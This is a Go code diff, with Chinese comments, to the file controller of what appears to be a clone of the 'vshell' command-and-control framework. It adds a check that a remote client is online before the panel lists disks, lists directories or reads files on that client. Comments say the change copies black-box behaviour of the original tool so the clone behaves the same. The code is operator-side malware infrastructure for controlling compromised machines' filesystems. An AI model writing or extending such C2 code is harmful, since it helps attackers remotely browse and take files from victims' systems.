@@ -35,6 +35,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"vshell/c2engine"
 )
 
 // FileController 管理客户端文件系统。
@@ -44,6 +46,20 @@ type FileController struct {
 
 func (c *FileController) clientID() int64 {
 	return int64(c.JsonGetInt("id"))
+}
+
+// requireClient 校验客户端存在且在线。
+//
+// 黑盒（R40）：原版文件类接口在客户端不存在/离线时统一返回 "connection error"
+// （不是空列表、也不是 client is close）。复刻端此前对 ls/getdisk 等"不经过
+// dispatchCmd"的接口会静默返回空结果，属于行为差异。
+func (c *FileController) requireClient(id int64) bool {
+	cl := c2engine.GetEngine().GetClient(id)
+	if cl == nil || !cl.Status {
+		c.JsonErr("connection error")
+		return false
+	}
+	return true
 }
 
 // dispatchOrReport 下发一条命令；客户端不可用时写 "connection error" 并返回 false。
@@ -65,6 +81,9 @@ func (c *FileController) Getdisk() {
 	id := c.clientID()
 	if id == 0 {
 		c.JsonErr("id error")
+		return
+	}
+	if !c.requireClient(id) {
 		return
 	}
 	req := `{"type":"diskinfo"}`
@@ -92,6 +111,9 @@ func (c *FileController) Ls() {
 	order := c.JsonGetStr("order")
 	if id == 0 {
 		c.JsonErr("id error")
+		return
+	}
+	if !c.requireClient(id) {
 		return
 	}
 	items, total := engineListDir(id, path, field, order)
@@ -171,6 +193,9 @@ func (c *FileController) Cat() {
 	target := c.JsonGetStr("target")
 	if id == 0 {
 		c.JsonErr("id error")
+		return
+	}
+	if !c.requireClient(id) {
 		return
 	}
 	// 走 JSON 命令（agent 的 CmdFileCat）：文本命令 "cat" 没有解析器，会落进 shell。
